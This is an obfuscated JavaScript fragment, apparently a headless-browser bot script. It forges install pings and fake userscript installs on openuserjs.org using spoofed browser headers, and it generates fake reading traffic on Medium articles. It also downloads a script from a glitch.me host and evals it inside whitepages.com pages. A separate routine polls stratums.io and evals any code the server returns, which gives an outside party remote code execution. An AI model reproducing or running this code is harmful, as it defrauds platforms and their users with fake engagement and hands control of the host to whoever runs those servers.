+ 0x2 * 0x27b + -0x5 * 0x3de) | ~V & X) + T + (-0x56e625d2 + -0x24f79a5c + 0x7 * 0x1ea00841) + Y[R + (-0x124 * -0x12 + 0x1 * 0x823 + -0x3 * 0x98d)] << 0x31a * -0x7 + 0x1 * 0x1f08 + -0x952, V = V << -0x5 * -0x4d9 + 0x1 * 0xb6f + -0x25 * 0xf6 | V >>> -0x146e + -0x2133 + 0x3 * 0x11e1;
                    for (; R < 0x231c + -0xd * 0x12b + -0x13c5; R += -0x3 * -0x207 + 0x1 * -0x1069 + -0x1 * -0xa59)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x378 + 0x19 * -0x12f + 0x2114 | T >>> 0x6ba + -0x7 * 0x3f1 + 0x14f8) + (U ^ V ^ W) + X + (0x5cf6e * 0x1831 + 0x4db5881 * 0x18 + -0x92456485) + Y[R] << -0x1a * -0x9 + 0x26b * -0x2 + 0x3ec) << -0x5ac + -0x7b * -0x1 + -0x536 * -0x1 | X >>> 0x1bd4 + 0x1f76 * 0x1 + -0x3b2f * 0x1) + (T ^ (U = U << 0x1 * -0x9f7 + 0x1c87 + -0x1272 | U >>> -0x1a74 + -0x4 * -0x115 + -0x2 * -0xb11) ^ V) + W + (-0x23efaa8b + -0x1e6bd1 * -0x45e + -0x2 * -0x6f75db7) + Y[R + (-0x326 + 0x3 * -0x137 + 0x6cc)] << 0xc9c + 0x2c0 * -0xc + -0x3a * -0x5a) << 0x1 * 0x576 + 0x13e8 + -0x1959 | W >>> 0x8bf * 0x4 + -0x24a * -0x8 + -0x3531) + (X ^ (T = T << -0x2 * -0x7bf + 0x1787 + -0x17 * 0x1b1 | T >>> -0x1 * -0x268a + -0x1ffd * 0x1 + 0x68b * -0x1) ^ U) + V + (0xa3b38abb + -0x92a2b85 * 0x15 + -0x1 * -0x8b9bf2cf) + Y[R + (0x13c2 + 0x695 + 0x3c3 * -0x7)] << -0x243f + -0x53f * 0x6 + 0x43b9) << 0x117 + 0x13fb + -0x13d * 0x11 | V >>> 0x17db + -0x1 * 0x12cd + 0x4f3 * -0x1) + (W ^ (X = X << 0x1565 * -0x1 + 0x190e + -0x38b * 0x1 | X >>> -0x1eb8 * -0x1 + 0xe73 + -0x2d29) ^ T) + U + (-0x2485 * 0x378bd + 0x729086b9 + -0x11b * -0x6f53db) + Y[R + (0x2 * 0xf47 + 0x1 * -0x15ad + -0x8de)] << -0xcb * -0x9 + -0xd * 0x2f + -0x4c0) << -0xad * 0x1d + 0xc89 * -0x2 + -0x1658 * -0x2 | U >>> 0xd03 * -0x1 + -0x2ed * 0x1 + -0x100b * -0x1) + (V ^ (W = W << -0x1896 + -0x18d6 + 0x318a | W >>> 0x7 * 0x569 + -0x1 * -0x1851 + -0x14ba * 0x3) ^ X) + T + (-0x8 * 0xef95d02 + 0xcde99221 + 0x18bb4190) + Y[R + (-0xb * 0x1f + -0x569 * -0x3 + 0xfe * -0xf)] << 0x10cb + 0x2 * -0xff5 + 0xf1f, V = V << 0x32 + -0x1a91 + -0x1 * -0x1a7d | V >>> 0x19bb + -0x1ea0 + 0x4e7;
                    for (; R < -0x12aa + -0x88 * -0xa + 0x2 * 0x6cb; R += -0x2028 + 0x1007 + -0x6a * -0x27)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x24e2 + -0xe1d + 0x4 * 0xcc1 | T >>> 0x1 * -0x1f23 + 0x1 * -0x23b2 + 0x42f0) + (U & V | U & W | V & W) + X - (-0x83f7ea25 + 0x6f373bde + 0x85a4f16b) + Y[R] << 0x1 * -0x1d55 + -0x6d7 + 0x242c) << 0x1e6d + 0x4f6 + 0x235e * -0x1 | X >>> 0x1fa3 + 0x2 * -0x3d1 + -0x17e6) + (T & (U = U << -0xe35 + -0x1 * -0x19b9 + -0x2 * 0x5b3 | U >>> 0x1b7d + -0x863 + -0x1318) | T & V | U & V) + W - (0x300d9e5 * 0x3a + 0xbaeece20 + -0xf83be8de) + Y[R + (-0x23d + -0x67b + -0x13f * -0x7)] << -0x1 * -0x701 + 0x16e9 + -0xe * 0x223) << 0x134b + -0x2c * 0x97 + -0x2 * -0x357 | W >>> 0x1199 + 0x1763 + -0x1 * 0x28e1) + (X & (T = T << -0x1 * 0xab1 + 0x1 * -0x225 + 0xcf4 | T >>> 0x21ca + 0xb1b + -0x2ce3) | X & U | T & U) + V - (0x8fb5603 * -0xb + -0x2 * 0x31d5a58a + 0x1375c4059) + Y[R + (0x64c + 0x27 * 0xf7 + -0x2beb)] << 0xe35 * 0x2 + 0x12d5 + -0x1 * 0x2f3f) << 0x3c8 + -0x21c3 + 0x1e00 | V >>> 0xda1 + 0xc47 * 0x3 + -0x325b * 0x1) + (W & (X = X << 0x1dc1 + -0x115c * -0x2 + -0x405b | X >>> -0x19e3 + -0x1 * -0xd72 + 0xc73) | W & T | X & T) + U - (-0x6b1e84b2 + 0x6cd7ea98 + -0x446925b * -0x1a) + Y[R + (-0x30c + 0xb5a + -0x84b)] << 0x15 * -0x39 + -0x6a3 + 0xb50) << -0x7f3 + -0x5ba + 0xdb2 | U >>> 0x3ef * 0x2 + 0x3 * 0x3d7 + -0x4 * 0x4d2) + (V & (W = W << 0x131b + -0x25 * 0xe2 + -0xdad * -0x1 | W >>> -0x2 * 0x10a9 + 0xcda + -0x2 * -0xa3d) | V & X | W & X) + T - (0x3b50553f + -0xa9ccc4fb + -0x1bec165c * -0x8) + Y[R + (-0x8f1 + -0x56 * 0x25 + 0x447 * 0x5)] << 0x112a + 0x1de5 + 0x6b9 * -0x7, V = V << 0x805 * -0x4 + -0x1bdf + -0x1 * -0x3c11 | V >>> 0x3 * 0x3a8 + 0x25 * 0x97 + -0x20c9;
                    for (; R < 0x1 * -0x705 + 0x2411 + -0x1cbc; R += -0x25 * 0xb9 + 0xf4c + 0xb76)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x8b7 + -0x145b + 0xba9 * 0x1 | T >>> -0x1ed7 + 0x189e + -0x87 * -0xc) + (U ^ V ^ W) + X - (0x13f3 * 0x20f54 + 0x408720af * 0x1 + -0x3401ab41) + Y[R] << 0x1 * -0x23f6 + 0x1d * 0xa1 + 0x11b9) << 0xc77 + -0x29 * -0x11 + -0xf2b | X >>> -0x2 * 0x10d + 0x1 * -0x8c5 + 0xafa) + (T ^ (U = U << 0x10c9 + 0x739 + 0x4 * -0x5f9 | U >>> 0xc0e + -0x1ae1 + 0xed5) ^ V) + W - (0x2945 * -0x16ac2 + 0x3f18edc3 + 0x30ff28b1) + Y[R + (0x1dc6 + -0x1 * 0x2ba + -0x1b0b)] << -0x51a * 0x3 + -0x1a82 + 0x29d0) << 0x119d + 0xaa8 + -0x1c4 * 0x10 | W >>> 0x1850 + -0x1f23 + 0x6ee) + (X ^ (T = T << -0xd * 0x2bb + 0x1983 + -0x2 * -0x50d | T >>> -0x1 * -0x281 + 0x5bb + -0x83a) ^ U) + V - (-0x7b * -0xc9906c + -0x3fd * 0x3f4a3 + 0x19877 * -0x1135) + Y[R + (-0xbb3 * 0x2 + 0x743 + 0x1025)] << -0x1129 + -0x1cfe + -0x2b7 * -0x11) << 0xb98 + 0x135 * 0x10 + -0x1ee3 * 0x1 | V >>> 0x1d0b + -0x5e4 * -0x6 + 0x176 * -0x2c) + (W ^ (X = X << -0xc28 + -0xdc7 + 0x1a0d | X >>> 0x7 * -0x4cf + -0x3 * 0x167 + 0x25e0) ^ T) + U - (-0x2f662523 + -0xadab948 * 0x2 + 0xd07d7 * 0x96b) + Y[R + (0x1409 + 0xa * 0x28a + -0x2d6a)] << -0x3 * 0xbd5 + 0x48e * 0x1 + 0x1ef1) << -0x4 * -0x42b + 0x116b + 0x31 * -0xb2 | U >>> -0x108b + -0x38 * -0x77 + 0x2 * -0x4b1) + (V ^ (W = W << -0xeae * -0x1 + -0xac1 + 0xd * -0x4b | W >>> -0x1 * -0x239d + -0x1614 + -0xd87) ^ X) + T - (0x16be * 0x1e09 + 0x8304a5b + 0x5 * 0x88d2d6d) + Y[R + (0x1 * 0x2590 + -0x1 * -0xe8f + 0x1 * -0x341b)] << -0xfa0 + -0x49 * -0x7d + -0x1405, V = V << -0x1430 + -0x162 * 0x1 + 0x2 * 0xad8 | V >>> 0x13 * 0x1f3 + -0x19a3 + -0xa2 * 0x12;
                    this['h0'] = this['h0'] + T << -0xa * 0x23d + 0x522 * 0x1 + 0x1140 * 0x1, this['h1'] = this['h1'] + U << 0x1 * 0x21ad + 0x5d5 * -0x3 + -0xda * 0x13, this['h2'] = this['h2'] + V << -0x223 * 0x8 + 0x1253 + -0x1 * 0x13b, this['h3'] = this['h3'] + W << -0xef7 + 0x1b31 * 0x1 + -0x61d * 0x2, this['h4'] = this['h4'] + X << -0x193f * -0x1 + 0x682 + -0x1fc1;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> 0x1 * 0x831 + -0xe * -0x32 + -0x27 * 0x47 & 0x142 * -0xa + -0x13 * 0x133 + 0x236c] + E[R >> 0x251 * -0x4 + -0x6f7 * 0x1 + 0x1 * 0x1053 & -0x1 * -0x11 + -0x1648 + 0x1646] + E[R >> 0x8 * 0x413 + -0x1d1d + -0x367 & 0x985 * 0x2 + -0x1 * -0x213f + 0x46 * -0xbf] + E[R >> -0xfc1 + 0x1 * 0x1f3a + 0x315 * -0x5 & 0x23cf + -0xb * 0x25f + -0x9ab] + E[R >> -0x2a4 + -0x2641 + 0x28f1 & -0x7 * 0x22d + -0x1 * -0x2ce + 0x2 * 0x63e] + E[R >> 0x3a7 * 0xa + -0x1e22 + -0x65c & -0x9 * 0x277 + -0xe6f + -0x29 * -0xe5] + E[R >> -0x29b + 0x61 * 0x5a + -0x1 * 0x1f7b & -0x84f + -0x19cc + 0x1 * 0x222a] + E[0xc6 * 0x1d + 0x1b32 + -0x3191 & R] + E[S >> 0xc5 * 0x16 + -0x8ef + -0x7e3 & -0x5a5 + -0xa1c + 0xfd0] + E[S >> -0x1d69 + -0x1 * -0x3b3 + 0x19ce & -0x2 * 0xb72 + 0x236e + -0xc7b] + E[S >> -0x12db + 0xbb2 + 0x73d & -0x1cdf + -0x9 * -0xd8 + 0x1556] + E[S >> 0xb * -0xa6 + -0x1825 * -0x1 + -0x1 * 0x10f3 & 0x3 * 0x2e4 + 0xa8f + 0x3 * -0x664] + E[S >> 0x767 * -0x3 + 0x1e14 + 0x1 * -0x7d3 & 0x148 * 0x5 + 0x1 * -0x20b9 + 0x1a60] + E[S >> 0x423 * -0x6 + 0x1614 + -0x2 * -0x163 & -0x1da5 + 0x19ea + 0x1e5 * 0x2] + E[S >> 0x2 * 0x91d + -0xfc8 + 0x2 * -0x137 & -0x1 * 0x326 + -0x232f + 0xccc * 0x3] + E[-0x35 * -0x3 + -0x1 * -0x234e + -0x23de & S] + E[T >> -0x258b + 0x185 * -0x8 + 0x31cf & 0x2349 + -0x5 * -0x2d + -0x241b] + E[T >> -0xc97 * -0x1 + -0x1df2 * -0x1 + 0x35 * -0xcd & 0x14 * 0x17b + -0x2401 + 0x674] + E[T >> -0x899 * 0x1 + 0x613 * -0x2 + 0x14d3 & 0x5b0 + 0xcff + -0x12a0] + E[T >> -0xe99 + 0x319 + 0xb9 * 0x10 & 0xa6a + -0x17a5 * -0x1 + -0x2200] + E[T >> 0x3 * -0x71b + -0x318 + 0x1875 & -0xd7b + -0xa13 + 0x179d] + E[T >> 0x1c98 + 0x1 * -0x632 + 0xe * -0x199 & 0x2b + 0x3d4 + 0x48 * -0xe] + E[T >> 0x1889 * 0x1 + -0xc6f * -0x3 + -0x3dd2 & -0x216e + -0x502 * 0x4 + 0x3585] + E[-0x153c + -0x74 * 0x23 + 0x2527 & T] + E[U >> -0x4 * -0xb5 + 0x18bb + -0x1b73 & 0xcf5 + -0x8ca + -0x41c] + E[U >> -0x16d1 * -0x1 + -0x3be * -0x6 + -0x2d2d & -0x5 * -0x2db + 0x500 + -0x1338] + E[U >> 0x19d1 * -0x1 + -0x22c4 + 0x3ca9 & -0x2484 + -0x29b * -0x1 + 0x21f8] + E[U >> 0x306 + -0x544 * 0x1 + 0x24e & 0x713 + 0x1 * 0x266 + -0x1e2 * 0x5] + E[U >> -0x38d * 0x6 + 0x7b5 * 0x1 + -0xda5 * -0x1 & -0xd25 + 0x18ba * 0x1 + 0xb86 * -0x1] + E[U >> -0x45a + -0x194b + 0x6b * 0x47 & -0x26e * -0x2 + 0xc61 + 0x2dd * -0x6] + E[U >> 0x81c + -0x22f3 * -0x1 + -0x2b0b & -0x245f + 0x4 * 0xcd + -0x109d * -0x2] + E[-0x7ab + 0x9de * -0x1 + 0x1 * 0x1198 & U] + E[V >> -0x1dfc + 0x1ae3 + 0x335 & 0xec5 * -0x2 + 0x7cb + 0x15ce] + E[V >> 0x1dce + 0x1ab9 + -0x386f & 0x2 * 0x11a9 + -0x2 * 0xe2 + -0x217f] + E[V >> -0x7b7 + 0x13 * 0x89 + -0x260 & -0x2 * 0xbba + -0x6 * 0x648 + 0x3d33 * 0x1] + E[V >> 0x980 + -0x256c + 0x1bfc & -0x244 + 0x191 + 0xc2 * 0x1] + E[V >> 0x1 * 0x137d + -0x5 * -0x565 + -0x2e6a & 0x25e5 + 0x10e + -0x26e4] + E[V >> -0x479 * 0x1 + 0x1 * 0x1259 + -0x2 * 0x6ec & -0x1f3 + -0x1f49 + 0x214b] + E[V >> 0x1a6c + 0x463 * -0x6 + -0x16 & 0x18de + -0x107 * 0x22 + 0xa1f * 0x1] + E[0x2310 + 0x2 * 0xa97 + -0x382f & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> 0x216b + -0x9 * 0x1a5 + -0x1286 & 0x2 * -0xec1 + 0x130e + 0xb73,
                      R >> -0x34 * 0xd + -0x26d7 + -0x1 * -0x298b & -0x4b8 + 0x1 * 0x19b2 + -0xa5 * 0x1f,
                      R >> 0x2a6 * -0x6 + 0x2069 + -0x107d & 0x12ab * -0x1 + 0x119d + 0x3 * 0xaf,
                      0x1 * -0x224d + -0x1 * -0x26f6 + -0x86 * 0x7 & R,
                      S >> -0x1028 + 0x21bc + -0x117c & 0x1b5d + -0x16e7 + -0x1 * 0x377,
                      S >> -0x2b * -0x11 + -0x1 * -0x1d4b + -0x2016 & -0x2 * -0x281 + -0x21b7 + 0x1db4,
                      S >> -0x30 * -0x66 + -0x23f2 * -0x1 + -0xb02 * 0x5 & -0x25cc + -0x1 * -0x1e8f + 0x83c,
                      0x1db + 0xd99 + 0x1 * -0xe75 & S,
                      T >> -0x57 * 0x71 + 0x1046 * -0x2 + -0x470b * -0x1 & 0x3 * -0x295 + -0x7f7 * 0x2 + -0x1 * -0x18ac,
                      T >> 0x5 * 0x56 + 0x5b1 * -0x5 + 0x1ad7 & 0xe61 + -0x2 * -0x943 + -0xff4 * 0x2,
                      T >> 0x3f6 + 0x75a * -0x3 + 0x1220 & -0x33e + 0x2 * 0xf2f + -0x1a21,
                      0x37 * 0x49 + 0xdd * 0x16 + -0x1 * 0x21ae & T,
                      U >> 0x211b + 0x1 * -0x1d29 + 0x1d * -0x22 & -0x723 * 0x3 + -0x148f * -0x1 + 0x1d9,
                      U >> 0x157f + -0x21ee + 0xc7f & 0x14d2 + -0x1151 * 0x2 + 0xecf,
                      U >> 0xa52 + 0x291 * -0x7 + 0x7ad & 0x1831 + -0x257d * -0x1 + -0x5 * 0xc23,
                      0x6d * -0x1 + -0x2 * 0x399 + 0x89e & U,
                      V >> -0x9a3 + -0x16 * 0x1a1 + 0x2d91 & -0x1b62 + 0x2510 + -0x8af,
                      V >> 0x1035 + 0x529 + -0x154e & 0x1585 + -0x198c + 0x506,
                      V >> -0xbf5 + -0x2 * -0x265 + 0x733 & 0xfb5 + 0x20d1 + 0x211 * -0x17,
                      0x1 * 0xd6a + -0x402 * -0x1 + -0x106d * 0x1 & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(-0x212b + -0x2e * -0xc4 + 0x1 * -0x1f9), (S = new DataView(R))['setUint32'](0x1 * 0x2149 + 0x6d2 + 0x1 * -0x281b, this['h0']), S['setUint32'](0x18e9 + 0xd9f + 0x154 * -0x1d, this['h1']), S['setUint32'](0x3 * -0x381 + -0x6dc + -0xf * -0x129, this['h2']), S['setUint32'](0x1b9d + -0x19e1 + -0x6 * 0x48, this['h3']), S['setUint32'](-0x1 * -0x1b7 + 0x1 * -0x1c73 + 0x1acc, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document[a3(0x12) + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x46a * -0x5 + -0xfc2 + 0x1 * -0x650];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = 0x1ebd + 0xf1 * 0xf + 0x4 * -0xb37;
                  R[-0x3 * 0x322 + 0x7c + 0x1 * 0x8ea]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[-0xd * -0x2c2 + 0x628 + -0x2a02] = T => {
                    const a4 = d;
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te']('data-scrip' + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), 0x75a + -0x1 * 0x1bf1 + 0x1498), W['overrideMi' + a4(0x3)]('text/plain'), W['onload'] = () => {}, W['send'](), S = 0xa2 * -0x16 + 0x12 * 0x152 + 0x1 * -0x9d7;
                    }
                  }), S || super(...R);
                }
              }, window['setTimeout'](() => {
                Q['click']();
              }, -0x2 * -0xe26 + -0x5f5 + 0x1 * -0x107b), Promise['resolve'](0xdc9 * 0x2 + -0x743 + -0x144e);
            }), await wait(NETWORK_PATIENCE), await B['close'](), await A['close'](), r()));
          }
        }
        for (let s = 0x2448 + 0x22d7 + -0x471f; s < 0xab3 + 0x7c * -0x3f + 0x13d2; s++)
          r();
      }, -0x236e + 0x1 * 0x1450 + 0x1 * 0xf82), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = -0x58d * 0x7 + -0x2621 + 0x4cfc;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = 0x6 * -0x50e + -0x15a5 + 0x33f9; u < getRandomInt(0x1 * 0x286 + 0x1 * -0x1b49 + 0x4 * 0x631, -0x11f6 + -0x6d3 * -0x2 + 0x455); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x2 * 0x82f9 + 0x1 * -0x133d6 + 0x11844);
          }
        }
      }, 0xc04 * -0x2 + 0x1220 + 0x1 * 0x64c), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          try {
            let s = -0x1424 + -0x13 * 0x23 + -0x1 * -0x16bd;
            const t = await n['newPage']();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(0x29 * 0x43 + -0x2697 + 0x2794), await t['evaluate'](() => {
              let u = new XMLHttpRequest();
              u['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * 0x1e16 + 0x22f7 + -0xb7 * 0x5b), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, -0x7 * -0x354 + -0x1 * -0x1625 + -0x25f * 0x13);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      const a5 = b;
      require(a5(0xb, 'mDzI'))['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x1a67 + -0x7 * -0x4cf + 0x878 * -0x7), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x908 + -0x1df5 + 0x468d);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = 0x2f8 + -0x13a7 + 0x10b0) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xc2d + 0x815 + 0x419));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](0x177a + -0x946 + -0xe34, A['indexOf']('\x20'));
            return y ? B['slice'](0x26de + -0x3 * 0x16f + -0x2291, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](0xc5f * 0x1 + -0x4021 + -0xf23 * -0x6),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](-0x14fa + -0x1d * 0x65 + 0x477b),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x247b + -0x13ee + 0x3869; h < 0x412 * -0x1 + 0x9 * -0x3b + 0x629; h++)
        setTimeout(f, (0x3 * -0x387b + 0x154b * -0x3 + 0x1d3b2) * h * getRandomInt(0x28 * 0x7d + -0x3de + -0xfa9, 0x1b1d * 0x1 + 0x4ec + 0x1003 * -0x2));
      setInterval(() => {
        f();
        for (let i = 0xbb8 + 0x6e9 + -0x1 * 0x12a1; i < -0x1 * -0x16 + -0x6d5 * -0x3 + 0x27 * -0x87; i++)
          setTimeout(f, (-0x13d2b * -0x1 + 0x8e * 0x4 + 0x5503 * -0x1) * i * getRandomInt(-0x4a0 + 0x19f * -0x4 + 0xb1d, -0x1f1f + -0xc54 + 0x2b76));
      }, -0x47a014 + 0x4 * -0x1b60df + 0xec1210);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        const a6 = d;
        try {
          axios['post']('https://st' + 'ratums.io/' + a6(0x10), {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, 0x3 * 0x6097 + 0x3af32 + -0x3d17);
    }
  ]
];
for (let e of actions)
  e[0x12 * 0x59 + 0x406 + -0xa48]() && setTimeout(e[-0x129 * 0x2 + -0xe72 + 0x10c5]);